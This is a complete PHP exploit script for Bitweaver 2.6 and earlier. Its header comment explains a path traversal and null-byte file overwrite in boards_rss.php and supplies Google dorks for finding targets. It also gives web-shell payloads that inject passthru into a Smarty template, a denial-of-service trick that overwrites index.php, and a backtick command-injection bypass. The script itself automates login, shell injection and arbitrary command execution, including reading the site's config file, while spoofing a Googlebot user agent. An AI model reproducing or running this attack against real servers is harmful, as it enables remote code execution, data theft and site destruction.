<?php
    /*
    Bitweaver <= 2.6 /boards/boards_rss.php / saveFeed() remote code execution exploit
    by Nine:Situations:Group::bookoo
     
    php.ini independent
     
    site: http://retrogod.altervista.org/
    software site: http://www.bitweaver.org/
     
    You need an user account and you need to change your "display name" in:
     
    {php}passthru($_SERVER[HTTP_CMD]);{/php}
     
    Register and click on Preferences, look at the "User Information" tab, inside the
    "Real name" text field write the code above, then click on Change.
     
    Google dorks:
    "by bitweaver" Version  powered +boards
    "You are running bitweaver in TEST mode"|"bitweaver * White Screen of Death"
     
    Versions tested: 2.6.0, 2.0.2
     
    Vulnerability type: folder creation, file creation, file overwrite, PHP code injection.
     
    Explaination:
    look at /boards/boards_rss.php, line 102:
    ...
    echo $rss->saveFeed( $rss_version_name, $cacheFile );
    ...
     
    it calls saveFeed() function in an insecure way, arguments are built on
    $_REQUEST[version] var and may contain directory traversal sequences...
     
    now look at saveFeed() function in /rss/feedcreator.class.php
     
    ...
    function saveFeed($filename="", $displayContents=true) {
    if ($filename=="") {
    $filename = $this->_generateFilename();
    }
    if ( !is_dir( dirname( $filename ))) {
    mkdir_p( dirname( $filename ));
    }
    $feedFile = fopen($filename, "w+");
    if ($feedFile) {
    fputs($feedFile,$this->createFeed());
    fclose($feedFile);
    if ($displayContents) {
    $this->_redirect($filename);
    }
    } else {
    echo "<br /><b>Error creating feed file, please check write permissions.</b><br />";
    }
    }
     
    }
    ...
     
    regardless of php.ini settings, you can create arbitrary folders, create/overwrite
    files, also you can end the path with an arbitrary extension, other than .xml passing
    a null char.
    ex.
     
    http://host/path_to_bitweaver/boards/boards_rss.php?version=/../../../../bookoo.php%00
     
    now you have a bookoo.php in main folder:
     
    <?xml version="1.0" encoding="UTF-8"?>
    <!-- generator="FeedCreator 1.7.2" -->
    <?xml-stylesheet href="http://www.w3.org/2000/08/w3c-synd/style.css" type="text/css"?>
    <rss version="0.91">
    <channel>
    <title> Feed</title>
    <description></description>
    <link>http://192.168.0.1</link>
    <lastBuildDate>Sat, 09 May 2009 20:01:44 +0100</lastBuildDate>
    <generator>FeedCreator 1.7.2</generator>
    <language>en-us</language>
    </channel>
    </rss>
     
    You could inject php code by the Host header (but this is used to build filenames and
    create problems, also most of servers will respond with an http error) inside link tag
    or by your "display name" in title tag, ex.:
     
    http://host/path_to_bitweaver/boards/boards_rss.php?version=/../../../../bookoo_ii.php%00&u=bookoo&p=password
     
    and here it is the new file (if your display name is "<?php passthru($_GET[cmd]; ?>"):
     
    <?xml version="1.0" encoding="UTF-8"?>
    <!-- generator="FeedCreator 1.7.2" -->
    <?xml-stylesheet href="http://www.w3.org/2000/08/w3c-synd/style.css" type="text/css"?>
    <rss version="0.91">
    <channel>
    <title> Feed (<?php passthru($_GET[cmd]; ?>))</title>
    <description></description>
    <link>http://192.168.0.1</link>
    <lastBuildDate>Tue, 12 May 2009 00:30:54 +0100</lastBuildDate>
    <generator>FeedCreator 1.7.2</generator>
    <language>en-us</language>
    </channel>
    </rss>
     
    if short_open_tag in php.ini is off (because of "<?xml ..." preamble
    generating a parse error with short_open_tag = on), you can now launch commands:
     
    http://host/path_to_bitweaver/bookoo_ii.php?cmd=ls
     
    However, to bypass short_open_tag = on you can inject in a template file, ex.:
     
    http://host/path_to_bitweaver/boards/boards_rss.php?version=/../../../../themes/templates/footer_inc.tpl%00&u=bookoo&p=password
     
    Now footer_inc.tpl looks like this:
     
    <?xml version="1.0" encoding="UTF-8"?>
    <!-- generator="FeedCreator 1.7.2" -->
    <?xml-stylesheet href="http://www.w3.org/2000/08/w3c-synd/style.css" type="text/css"?>
    <rss version="0.91">
    <channel>
    <title> Feed ({php}passthru($_GET[CMD]);{/php})</title>
    <description></description>
    <link>http://192.168.0.1</link>
    <lastBuildDate>Tue, 12 May 2009 00:43:01 +0100</lastBuildDate>
    <generator>FeedCreator 1.7.2</generator>
    <language>en-us</language>
    </channel>
    </rss>
     
    note that the shellcode is in Smarty template syntax ...
     
    Now you can launch commands from the main page:
     
    http://host/path_to_bitweaver/index.php?cmd=ls%20-la
     
    or
     
    http://host/path_to_bitweaver/wiki/index.php?cmd=ls%20-la
     
    Additional notes:
     
    Without to have an account you can create a denial of service condition, ex. by replacing the main index.php:
     
    http://host/path_to_bitweaver/boards/boards_rss.php?version=/../../../../index.php%00
     
    I found also a bug in Smarty template system, against windows servers you can launch commands
    with this:
     
    {math equation="`^C^A^L^C`"}
     
    They filtered non-math functions, but they forgot php bacticks operators. This is
    the same of launch exec() !
     
    */
    $err[0] = "[!] This script is intended to be launched from the cli!";
    $err[1] = "[!] You need the curl extesion loaded!";
     
    if (php_sapi_name() <> "cli") {
        die($err[0]);
    }
    if (!extension_loaded('curl')) {
        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
        false;
        if ($win) {
            !dl("php_curl.dll") ? die($err[1]) :
            nil;
        } else {
            !dl("php_curl.so") ? die($err[1]) :
            nil;
        }
    }
     
    function syntax() {
        print (
        "Syntax: php ".$argv[0]." [host] [path] [user] [pass] [cmd] [options]   \n". "Options:                                                               \n". "--port:[port]       - specify a port                                   \n". "                      default->80                                      \n". "--proxy:[host:port] - use proxy                                        \n". "Examples:   php ".$argv[0]." 192.168.0.1 /bitweaver/ bookoo pass ls    \n". "            php ".$argv[0]." 192.168.0.1 / bookoo pass ls -a --proxy:1.1.1.1:8080\n". "            php ".$argv[0]." 192.168.0.1 / bookoo pass cat ../kernel/config_inc.php --port:81");
        die();
    }
     
     
    error_reporting(E_ALL);
    $host = $argv[1];
    $path = $argv[2];
    $_usr = $argv[3];
    $_pwd = $argv[4];
    $_cmd = "";
    for ($i = 5; $i < $argc; $i++) {
        if ((!strstr($argv[$i], "--proxy:")) and (!strstr($argv[$i], "--port:"))) {
            $_cmd .= " ".$argv[$i];
        }
    }
    $argv[5] ? print("[*] Command->$_cmd\n") :
     syntax();
    $_use_proxy = false;
    $port = 80;
     
    for ($i = 3; $i < $argc; $i++) {
        if (stristr($argv[$i], "--proxy:")) {
            $_use_proxy = true;
            $tmp = explode(":", $argv[$i]);
            $proxy_host = $tmp[1];
            $proxy_port = (int)$tmp[2];
        }
        if (stristr($argv[$i], "--port:")) {
            $tmp = explode(":", $argv[$i]);
            $port = (int)$tmp[1];
        }
    }
     
    function _s($url, $cmd, $is_post, $request) {
        global $_use_proxy, $proxy_host, $proxy_port, $cookie;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($is_post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $request."\r\n");
        }
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Googlebot/1.0 (googlebot@googlebot.com http://googlebot.com/)");
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        $headers = array("Cookie: $cookie", "Cmd: ".$cmd." > ./../readme");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
         
        if ($_use_proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
        }
        $_d = curl_exec($ch);
        if (curl_errno($ch)) {
            die("[!] ".curl_error($ch)."\n");
        } else {
            curl_close($ch);
        }
        return $_d;
    }
     
    $my_template = "themes/templates/footer_inc.tpl";
    $url = "http://$host:$port".$path."boards/boards_rss.php";
    $_o = _s($url, "", 0, "");
    if (stristr($_o, "404 Not Found")) {
        die ("[!] Vulnerable script not found!\n");
    }
    //catch site cookie, this is needed for version compatibility, not needed in 2.6.0
    $_tmp = explode("Set-Cookie: ", $_o);
    $cookie = "";
    for ($i = 1; $i < count($_tmp); $i++) {
        $_tmpii = explode(";", $_tmp[$i]);
         $cookie .= $_tmpii[0]."; ";
    }
    print("[*] Cookie->".$cookie."\n");
    $_o = _s($url, "", 1, "version=/\x00&");
    $_o = _s($url, "", 1, "u=$_usr&p=$_pwd&version=/../../../../$my_template\x00&");
    if (stristr($_o, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>")) {
        print ("[*] '$my_template' successfully overwritten!\n");
    } else {
        print($_o);
        die("[!] Error! No write permission on /".$my_template." ...");
    }
    if (stristr($_o, "{php}passthru(\$_SERVER[HTTP_CMD]);{/php}")) {
        print ("[*] Shell injected!\n");
    } else {
        print($_o);
        die("[!] Error! Shell not injected!");
    }
    $url = "http://$host:$port".$path."wiki/index.php";
    $_o = _s($url, $_cmd, 0, "");
    $url = "http://$host:$port".$path."readme";
    $_o = _s($url, "", 0, "");
    if (stristr($_o, "404 Not Found")) {
        die ("[!] stdout file not found!\n");
    } else {
        print("[*] Success!\n".$_o);
    }
?>
